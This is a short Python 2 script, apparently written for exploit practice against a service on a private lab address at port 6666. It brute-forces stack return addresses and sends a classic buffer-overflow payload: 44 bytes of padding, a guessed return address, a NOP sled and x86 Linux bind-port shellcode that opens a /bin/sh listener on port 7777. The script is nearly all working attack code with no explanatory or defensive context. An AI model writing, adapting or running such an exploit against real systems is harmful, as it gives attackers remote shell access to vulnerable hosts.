from socket import *
from struct import *

HOST = "192.168.196.128"
PORT = 6666

# x86/linux/bindport: 84 bytes
# port=7777, host=127.0.0.1
shellcode = (
    "\x31\xdb\x53\x43\x53\x6a\x02\x6a\x66\x58\x99\x89\xe1\xcd\x80\x96"
    "\x43\x52\x66\x68\x1e\x61\x66\x53\x89\xe1\x6a\x66\x58\x50\x51\x56"
    "\x89\xe1\xcd\x80\xb0\x66\xd1\xe3\xcd\x80\x52\x52\x56\x43\x89\xe1"
    "\xb0\x66\xcd\x80\x93\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\xb0"
    "\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53"
    "\x89\xe1\xcd\x80"
)

for i in range(0xFF, 0x00, -1):
    for j in range(0xFF, 0x00, -20):
        payload = ""
        payload = payload + "A"*44
        payload = payload + chr(j) + chr(i) + "\xff\xbf"
        payload = payload + "\x90"*100
        payload = payload + shellcode
        
        s = socket(AF_INET, SOCK_STREAM)
        s.connect((HOST, PORT))

        print "[*] ret address: " + hex(j) + " " + hex(i)
        print s.recv(100)
        print s.recv(10)
        s.send(payload)
        s.close()
